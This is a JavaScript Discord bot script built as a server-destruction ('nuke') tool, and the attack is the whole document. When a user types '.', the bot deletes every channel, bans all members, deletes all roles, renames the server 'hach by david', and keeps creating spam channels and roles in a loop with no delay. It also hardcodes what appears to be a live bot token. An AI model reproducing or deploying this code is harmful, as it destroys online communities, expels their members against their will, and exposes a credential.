const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("hach by david");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("hach by david", "voice");///////bo channel 
        message.guild.createChannel("hach by david", "text");////bo voice
        message.guild.createRole({ name: "hach by david" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODk0MzUzOTk2MTcxNTk5OTMy.YVoyEA.WmimzCb8nO_XPgKwJSlGSWmZ0Jg");
